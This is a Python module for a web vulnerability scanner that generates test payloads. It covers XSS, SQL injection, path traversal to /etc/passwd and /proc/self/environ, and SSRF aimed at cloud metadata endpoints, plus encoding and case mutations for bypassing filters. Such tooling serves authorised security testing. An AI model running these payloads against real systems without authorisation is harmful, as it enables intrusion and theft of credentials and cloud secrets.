"""
Payload Generator - Intelligent payload creation
"""

import random
from typing import List, Dict, Any


class PayloadGenerator:
    """Generate intelligent payloads for vulnerability testing"""
    
    def __init__(self, config):
        """Initialize payload generator"""
        self.config = config
        
    def generate_xss_payloads(self, context: str = 'default') -> List[str]:
        """Generate XSS payloads based on context"""
        payloads = {
            'default': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg/onload=alert(1)>',
                '"><script>alert(1)</script>',
                "'><script>alert(1)</script>",
            ],
            'attribute': [
                '" onload="alert(1)',
                '\' onload=\'alert(1)',
                '" autofocus onfocus="alert(1)',
            ],
            'javascript': [
                'javascript:alert(1)',
                'javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>',
            ]
        }
        
        return payloads.get(context, payloads['default'])
    
    def generate_sqli_payloads(self, dbms: str = 'generic') -> List[str]:
        """Generate SQL injection payloads"""
        payloads = {
            'generic': [
                "'",
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
            ],
            'mysql': [
                "' OR 1=1#",
                "' UNION SELECT NULL,NULL#",
                "' AND SLEEP(5)#",
            ],
            'mssql': [
                "' OR 1=1--",
                "'; WAITFOR DELAY '00:00:05'--",
            ],
            'postgresql': [
                "' OR 1=1--",
                "' AND pg_sleep(5)--",
            ]
        }
        
        return payloads.get(dbms, payloads['generic'])
    
    def generate_lfi_payloads(self, os: str = 'linux') -> List[str]:
        """Generate LFI payloads"""
        payloads = {
            'linux': [
                '/etc/passwd',
                '../etc/passwd',
                '../../etc/passwd',
                '../../../etc/passwd',
                '../../../../etc/passwd',
                '/etc/hosts',
                '/proc/self/environ',
            ],
            'windows': [
                'C:\\windows\\win.ini',
                '..\\windows\\win.ini',
                '..\\..\\windows\\win.ini',
                'C:\\windows\\system32\\drivers\\etc\\hosts',
            ]
        }
        
        return payloads.get(os, payloads['linux'])
    
    def generate_ssrf_payloads(self) -> List[str]:
        """Generate SSRF payloads"""
        return [
            'http://127.0.0.1',
            'http://localhost',
            'http://169.254.169.254/latest/meta-data/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'file:///etc/passwd',
        ]
    
    def mutate_payload(self, payload: str, technique: str = 'encode') -> List[str]:
        """Mutate payload to bypass filters"""
        mutations = [payload]
        
        if technique == 'encode':
            # URL encoding
            mutations.append(payload.replace('/', '%2f'))
            mutations.append(payload.replace('<', '%3c').replace('>', '%3e'))
            
        elif technique == 'case':
            # Case variation
            mutations.append(payload.upper())
            mutations.append(payload.lower())
            mutations.append(self._random_case(payload))
            
        elif technique == 'double':
            # Double encoding
            mutations.append(payload.replace('/', '%252f'))
            
        return mutations
    
    def _random_case(self, text: str) -> str:
        """Randomize case of string"""
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in text)
